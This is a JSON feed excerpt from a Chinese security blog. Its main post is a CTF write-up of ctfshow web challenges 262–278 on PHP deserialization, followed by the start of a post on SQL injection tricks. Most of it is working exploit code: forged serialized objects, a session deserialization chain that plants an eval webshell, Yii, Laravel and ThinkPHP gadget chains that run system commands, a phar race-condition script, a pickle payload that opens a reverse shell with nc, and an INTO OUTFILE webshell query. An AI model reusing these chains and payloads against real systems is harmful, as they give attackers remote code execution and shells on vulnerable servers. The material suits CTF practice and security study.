16:05:38\n# @message.php\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n</code></pre>\n<p>进入后发现并没有提供flag的地方，从头阅读源码，可以看到最上面注释有<code>message.php</code>，访问，得到</p>\n<p>message.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 15:13:03\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 15:17:17\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg-&gt;token=='admin'){\n        echo $flag;\n    }\n}\n</code></pre>\n<p>阅读代码，可知只需构造一个message类，token为<code>admin</code>即可，故exp.php</p>\n<pre><code class=\"php\">&lt;?php\n    class message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n\necho base64_encode(serialize(new message(\"1\",\"1\",\"1\")));\n</code></pre>\n<p>payload:<code>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p>\n<p>设置cookie的msg为此值，得到flag</p>\n<h1 id=\"web-263\"><a href=\"#web-263\" class=\"headerlink\" title=\"web 263\"></a>web 263</h1><p>进入后是一个登陆界面，看似为sql注入，实则不是</p>\n<p>url输入<code>www.zip</code>可以下载题目的源码，可以看到如下文件结构</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web263_1.jpg\"></p>\n<p>index.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:28:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:21:45\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n    error_reporting(0);\n    session_start();\n    //超过5次禁止登陆\n    if(isset($_SESSION['limit'])){\n        $_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n    }else{\n         setcookie(\"limit\",base64_encode('1'));\n         $_SESSION['limit']= 1;\n    }\n    \n?&gt;\n</code></pre>\n<p>check.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:59:10\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:15:38\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=&gt;$_GET['u'],\"pass\"=&gt;$_GET['pass']);\n\n\nif($GET){\n\n    $data= $db-&gt;get('admin',\n    [\t'id',\n        'UserName0'\n    ],[\n        \"AND\"=&gt;[\n        \"UserName0[=]\"=&gt;$GET['u'],\n        \"PassWord1[=]\"=&gt;$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n        ]\n    ]);\n    if($data['id']){\n        //登陆成功取消次数累计\n        $_SESSION['limit']= 0;\n        echo json_encode(array(\"success\",\"msg\"=&gt;\"欢迎您\".$data['UserName0']));\n    }else{\n        //登陆失败累计次数加1\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n        echo json_encode(array(\"error\",\"msg\"=&gt;\"登陆失败\"));\n    }\n}\n</code></pre>\n<p>inc.php</p>\n<pre><code class=\"php\">&lt;?php\n    ...\n    class User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n    function setStatus($s){\n        $this-&gt;status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this-&gt;username, \"使用\".$this-&gt;password.\"登陆\".($this-&gt;status?\"成功\":\"失败\").\"----\".date_create()-&gt;format('Y-m-d H:i:s'));\n    }\n}\n...\n</code></pre>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p>可以看到在inc.php中，User的<code>__destruct</code>方法有<code>file_put_contents</code>方法，那么可以尝试一句话木马写文件，那么必须创建User对象</p>\n<p>查看源码流程,由于一开始进入，便会设置cookie及session，故略去if为false的情况</p>\n<p>index.php</p>\n<pre><code class=\"php\">$_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n</code></pre>\n<p>由于在index.php中无User类，故这里有用的只有设置session值</p>\n<p>故还需到check.php中，运行<code>$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);</code></p>\n<p>故设置好cookie的limit值后，前后各访问一次index.php和check.php，就能创建木马文件</p>\n<p>这里用到了<code>PHP的session反序列化漏洞</code>知识，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt\">参考文章</span></p>\n<h2 id=\"php-session反序列化漏洞\"><a href=\"#php-session反序列化漏洞\" class=\"headerlink\" title=\"php session反序列化漏洞\"></a>php session反序列化漏洞</h2><h3 id=\"php-ini-与session有关的配置\"><a href=\"#php-ini-与session有关的配置\" class=\"headerlink\" title=\"php.ini 与session有关的配置\"></a>php.ini 与session有关的配置</h3><pre><code class=\"ini\">session.save_path=\"\"  --设置session的存储路径\nsession.save_handler=\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)\nsession.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动\nsession.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php \n</code></pre>\n<p>其中<code>session.serialize_handler</code>共有三项值，各存储方式如下</p>\n<ul>\n<li><p>php_binary：键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>\n<p>如：<code>names:6:\"spoock\";</code></p>\n</li>\n<li><p>php：键名+竖线+经过serialize()函数序列处理的值</p>\n<p>如：<code>name|s:6:\"spoock\";</code></p>\n</li>\n<li><p>php_serialize(php&gt;5.5.4)：经过serialize()函数序列化处理的值 </p>\n<p>如：<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code></p>\n</li>\n</ul>\n<p>当在<code>php</code>引擎设置下解析<code>a:1:{s:4:\"ryat\";s:30:\"|O:1:\"A\":1:{s:1:\"a\";s:2:\"xx\";}</code>时，由于在该设置下会以<code>|</code>为界，左边为key，右边为value，然后进行反序列化，最后得到</p>\n<p><code>a:1:{s:4:\"ryat\";s:30:\"</code> = A类对象</p>\n<p>从而得到一个A类对象</p>\n<p>因此，在这题，可以利用该原理获取一个User类对象</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n\necho urlencode(base64_encode(\"|\".serialize(new User(\"a.php\",'&lt;?php eval($_POST[1]);?&gt;'))));\n</code></pre>\n<p>[注：这里使用<code>urlencode</code>主要是为了防止影响结果，在做题时因<code>+</code>导致无法出结果]{.red}</p>\n<p>User对象已经构建，按照前面分析进行操作，生成的木马文件为<code>log-a.php</code></p>\n<p>访问</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\Web-vip\\web263_2.jpg\"></p>\n<p>一次post以下，得到flag</p>\n<pre><code class=\"raw\">1=system('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-264\"><a href=\"#web-264\" class=\"headerlink\" title=\"web 264\"></a>web 264</h1><p>相比较于web262，此时反序列化对象由index.php中的<code>$_SESSION['msg']</code>传递，因此不能像web262那样解题，而是涉及到字符串逃逸。</p>\n<p>这一题的字符串逃逸比较简单</p>\n<p>首先编写以下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",\"\");\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:0:\"\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>复制<code>\";s:5:\"token\";s:5:\"admin\";}</code>，作为构造的结尾</p>\n<p>再编写代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:27:\"\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>可以看到，构造的结尾共有27个字符，而<code>fuck</code>替换为<code>loveU</code>增加了一个字符，故共需要27个<code>fuck</code></p>\n<p>编写如下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$s = str_repeat(\"fuck\",27);\necho $s.'\";s:5:\"token\";s:5:\"admin\";}',\"&lt;/br&gt;\";\n$a = new message(\"\",\"\",$s.'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}\nO:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:135:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}\n</code></pre>\n<p>经检查，<code>to</code>替换后135的末尾恰为最后一个<code>loveU</code>的结尾，故构造正确</p>\n<p>因此payload:<code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>提交后，再访问message.php，由于需要设置cookie的msg值，故设置，刷新网页，得到flag</p>\n<h1 id=\"web-265\"><a href=\"#web-265\" class=\"headerlink\" title=\"web 265\"></a>web 265</h1><p>php按地址传参</p>\n<p>变量引用</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct($t,$p){\n        $this-&gt;token=$t;\n        $this-&gt;password = &amp;$this-&gt;token;\n    }\n    public function login(){\n        return $this-&gt;token===$this-&gt;password;\n    }\n}\n\n$a = new ctfshowAdmin(\"\",'');\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-266\"><a href=\"#web-266\" class=\"headerlink\" title=\"web 266\"></a>web 266</h1><p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-04 23:52:24\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-05 00:17:08\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function login(){\n        return $this-&gt;username===$this-&gt;password;\n    }\n    public function __toString(){\n        return $this-&gt;username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n</code></pre>\n<p>payload:<code>O:7:\"Ctfshow\":0:{}</code></p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web266.jpg\"></p>\n<h1 id=\"web-267\"><a href=\"#web-267\" class=\"headerlink\" title=\"web 267\"></a>web 267</h1><p>弱密码登入admin/admin</p>\n<p>查看源码知view-source</p>\n<p>在page下找到反序列换入口</p>\n<pre><code class=\"php\">unserialize(base64_decode($_GET['code']))\n</code></pre>\n<p>这里为<code>yii</code>的反序列化链</p>\n<p>只有<code>passthru</code>有回显</p>\n<p>最后的payload：</p>\n<pre><code class=\"raw\">?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19\n</code></pre>\n<p>脚本</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'passthru';\n            $this-&gt;id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this-&gt;formatters['close'] = [new CreateAction, 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this-&gt;_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n\n?&gt;\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwczovL21wLndlaXhpbi5xcS5jb20vcz9fX2Jpej1NelU1TURJME9ESTVNUT09Jm1pZD0yMjQ3NDg1MTI5JmlkeD0xJnNuPWIyN2UzZmU4NDVkYWVlMmZiMTNiYjlmMzZmNTNhYjQw\">复现文章2</span></p>\n<h1 id=\"web-268\"><a href=\"#web-268\" class=\"headerlink\" title=\"web 268\"></a>web 268</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\n// poc2\nnamespace Codeception\\Extension{\n    use Faker\\Generator;\n    class RunProcess{\n        private $processes;\n        public function __construct()\n        {\n            $this-&gt;processes = [new Generator()];\n        }\n    }\n}\nnamespace{\n    // 生成 poc\n    echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-269\"><a href=\"#web-269\" class=\"headerlink\" title=\"web 269\"></a>web 269</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['render'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n\n    use Faker\\Generator;\n\n    class See{\n        protected $description;\n        public function __construct()\n        {\n            $this-&gt;description = new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys = [];\n        private $path;\n        public function __construct()\n        {\n            $this-&gt;path = new See;\n            $this-&gt;keys = array(\n                \"axin\"=&gt;array(\"is\"=&gt;\"handsome\")\n            );\n        }\n    }\n    // 生成 poc\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-270\"><a href=\"#web-270\" class=\"headerlink\" title=\"web 270\"></a>web 270</h1><p>也可以反弹shell</p>\n<p><code>$exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"nc xx.xx.xx.xx port -e /bin/sh\");</code></p>\n<pre><code class=\"php\">&lt;?php\nnamespace yii\\rest {\n    class Action\n    {\n        public $checkAccess;\n    }\n    class IndexAction\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;checkAccess = $func;\n            $this-&gt;id = $param;\n        }\n    }\n}\nnamespace yii\\web {\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct($func, $param)\n        {\n            $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param);\n        }\n    }\n}\nnamespace {\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"echo '&lt;?php eval(\\$_POST[1]); ?&gt;' &gt; 1.php\");\n    echo(base64_encode(serialize($exp)));\n}\n</code></pre>\n<h1 id=\"web-271\"><a href=\"#web-271\" class=\"headerlink\" title=\"web 271\"></a>web 271</h1><p>laravel5.7 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace Illuminate\\Foundation\\Testing {\n    class PendingCommand\n    {\n        public $test;\n        protected $app;\n        protected $command;\n        protected $parameters;\n\n        public function __construct($test, $app, $command, $parameters)\n        {\n            $this-&gt;test = $test;                 // 一个实例化的类 Illuminate\\Auth\\GenericUser\n            $this-&gt;app = $app;                   // 一个实例化的类 Illuminate\\Foundation\\Application\n            $this-&gt;command = $command;           // 要执行的 php 函数 system\n            $this-&gt;parameters = $parameters;     // 要执行的 php 函数的参数  array ('id')\n        }\n    }\n}\n\nnamespace Faker {\n    class DefaultGenerator\n    {\n        protected $default;\n\n        public function __construct($default = null)\n        {\n            $this-&gt;default = $default;\n        }\n    }\n}\n\nnamespace Illuminate\\Foundation {\n    class Application\n    {\n        protected $instances = [];\n\n        public function __construct($instances = [])\n        {\n            $this-&gt;instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances;\n        }\n    }\n}\n\nnamespace {\n    $defaultgenerator = new Faker\\DefaultGenerator(array(\"hello\" =&gt; \"world\"));\n\n    $app = new Illuminate\\Foundation\\Application();\n\n    $application = new Illuminate\\Foundation\\Application($app);\n\n    $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('whoami'));\n\n    echo urlencode(serialize($pendingcommand));\n}\n</code></pre>\n<h1 id=\"web-272、273\"><a href=\"#web-272、273\" class=\"headerlink\" title=\"web 272、273\"></a>web 272、273</h1><p>laravel5.8 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n/*\nAuthor:monitor\ndescription:\n    laravel deserialization chain\n*/\nnamespace Illuminate\\Broadcasting\n{\n    class PendingBroadcast{\n        protected $events;\n        protected $event;\n        public function __construct($events,$event)\n        {\n            $this-&gt;events = $events;\n            $this-&gt;event = $event;\n        }\n    }\n}\n\nnamespace Illuminate\\Bus\n{\n    class Dispatcher{\n        protected $queueResolver;\n        public function __construct($queueResolver)\n        {\n            $this-&gt;queueResolver = $queueResolver;\n        }\n    }\n}\n\nnamespace Mockery\\Loader\n{\n    class EvalLoader{\n\n    }\n}\n\nnamespace Mockery\\Generator\n{\n    class MockDefinition{\n        protected $config;\n        protected $code;\n        public function __construct($config,$code){\n            $this-&gt;config = $config;\n            $this-&gt;code = $code;\n        }\n    }\n    class MockConfiguration{\n        protected $name;\n        public function __construct($name)\n        {\n            $this-&gt;name = $name;\n        }\n    }\n}\n\nnamespace Illuminate\\Queue\n{\n    class CallQueuedClosure{\n        public $connection;\n        public function __construct($connection)\n        {\n            $this-&gt;connection = $connection;\n        }\n    }\n}\n\nnamespace\n{   \n    if($argc&lt;2){\n        echo \"Description:\\n\\tUse laravel deserialization to eval php code,don't need to input php tags.\";\n        echo \"\\nUsage:\" .$argv[0] . \" &lt;code&gt;\";\n        exit();\n    }\n    $code = $argv[1];\n    $mockconfiguration = new Mockery\\Generator\\MockConfiguration(\"pass\");\n    $mockdefination = new Mockery\\Generator\\MockDefinition($mockconfiguration,\"&lt;?php \".$code.\" exit;?&gt;\");\n    $callqueuedclosure = new Illuminate\\Queue\\CallQueuedClosure($mockdefination);\n    $evaload = new Mockery\\Loader\\EvalLoader();\n    $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evaload,\"load\"));\n    $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$callqueuedclosure);\n    echo urlencode(serialize($pendingbroadcast));\n}\n</code></pre>\n<p>xxxxxxxxxx&nbsp;0;alter table ctfshow_user change <code>username</code> <code>pass2</code> varchar(100);alter table ctfshow_user change <code>pass</code> <code>username</code> varchar(100);alter table ctfshow_user change <code>pass2</code> <code>pass</code> varchar(100);sql</p>\n<h1 id=\"web-274\"><a href=\"#web-274\" class=\"headerlink\" title=\"web 274\"></a>web 274</h1><p>thinkphp 5.1 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\nnamespace think;\nabstract class Model{\n    protected $append = [];\n    private $data = [];\n    function __construct(){\n        $this-&gt;append = [\"lin\"=&gt;[\"calc.exe\",\"calc\"]];\n        $this-&gt;data = [\"lin\"=&gt;new Request()];\n    }\n}\nclass Request\n{\n    protected $hook = [];\n    protected $filter = \"system\";\n    protected $config = [\n        // 表单 ajax 伪装变量\n        'var_ajax'         =&gt; '_ajax',  \n    ];\n    function __construct(){\n        $this-&gt;filter = \"system\";\n        $this-&gt;config = [\"var_ajax\"=&gt;'lin'];\n        $this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];\n    }\n}\n\n\nnamespace think\\process\\pipes;\n\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n\n    public function __construct()\n    {\n        $this-&gt;files=[new Pivot()];\n    }\n}\nnamespace think\\model;\n\nuse think\\Model;\n\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?&gt;\n</code></pre>\n<p><code>$lin</code> GET 赋值</p>\n<h1 id=\"web-275\"><a href=\"#web-275\" class=\"headerlink\" title=\"web 275\"></a>web 275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是<code>true</code>就可以执行系统命令了。最后再拼接一下命令<br>payload</p>\n<pre><code class=\"php\">?fn=;cat f*\ndata: flag=123\n</code></pre>\n<h1 id=\"web-276\"><a href=\"#web-276\" class=\"headerlink\" title=\"web 276\"></a>web 276</h1><p>在上个题的基础上增了了判断<code>$this-&gt;admin</code>所以真的需要我们去通过反序列化修改<code>admin</code>的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过<code>file_put_contents</code>写<code>phar</code>文件，然后再通过<code>file_put_contents</code>触发<code>phar</code>反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成<code>phar</code>文件</p>\n<pre><code class=\"php\">&lt;?php\n\nclass filter{\n    public $filename = \"1|cat f*\";\n    public $filecontent;\n    public $evilfile = true;\n    public $admin = true;\n}\n\n$phar = new Phar(\"phar.phar\");\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");\n\n$o = new filter();\n$phar-&gt;setMetadata($o);\n$phar-&gt;addFromString(\"test.txt\", \"test\");\n$phar-&gt;stopBuffering();\n</code></pre>\n<p>条件竞争</p>\n<pre><code class=\"python\">import requests\nimport threading\nimport base64\nurl = 'http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/'\n\nf = open('./phar.phar', 'rb')\n\ndata = f.read()\nflag = False\n\ndef work1():\n    requests.post(url+\"?fn=a\", data=data)\n\n\ndef work2():\n    global flag\n    r = requests.post(url+\"?fn=phar://phar.phar/\", data=\"\")\n    if \"flag{\" in r.text and flag is False:\n        print(base64.b64encode(r.text.encode()))\n        flag = True\n\nwhile flag is False:\n    a = threading.Thread(target=work1)\n    b = threading.Thread(target=work2)\n    a.start()\n    b.start()\n</code></pre>\n<h1 id=\"web-277-278\"><a href=\"#web-277-278\" class=\"headerlink\" title=\"web 277 278\"></a>web 277 278</h1><pre><code class=\"python\">import pickle\nimport base64\nclass A(object):\n    def __reduce__(self):\n        return(eval,('__import__(\"os\").popen(\"nc xxx.xxx.xxx.xxx 4567 -e /bin/sh\").read()',))\na=A()\ntest=pickle.dumps(a)\nprint(base64.b64encode(test))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/35cb7ca5/",
            "url": "http://dpm12345.cn/posts/35cb7ca5/",
            "title": "SQL 注入",
            "date_published": "2022-10-04T14:15:40.000Z",
            "content_html": "<ul>\n<li>\n<p>若对返回值进行过滤</p>\n<ul>\n<li>\n<p>可以在该字段名前加上 <code>hex()</code>  十六进制编码</p>\n</li>\n<li>\n<p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p>\n</li>\n</ul>\n</li>\n<li>\n<p>sql 注入也可以将内容写入到外部文件中，</p>\n<p>如 <code>select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile '/var/www/html/1.php'</code></p>\n<p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p>\n<p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code>  下的 <code>config.php</code>  文件中)</p>\n<p>之后找到 flag</p>\n</li>\n<li>\n<p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p>\n<p>其中 <code>%</code>  匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p>\n<p>如 <code>select id,username,password from users where username=0x666c6167;</code>  也是可以的，查询出 <code>username='flag'</code>  的情况</p>\n<p>或者用 <code>base64</code>  编码</p>\n</li>\n<li>\n<p>where 被过滤可以使用 having，同 where 用法</p>\n</li>\n<li>\n<p>若 ban 了数字，那么可以使用 <code>true，false</code>  来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code>  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p>\n<p><code>select username,password from users where id=concat(true,true);</code></p>\n<p>等价于 <code>select username,password from users where id='11';</code></p>\n</li>\n<li>\n<p>对于 select 的查询语句</p>\n<p><code>select count(*) from users where username='8' or 'a23';</code></p>\n<p>返回结果是 0</p>\n<p><code>select count(*) from users where username='8' or 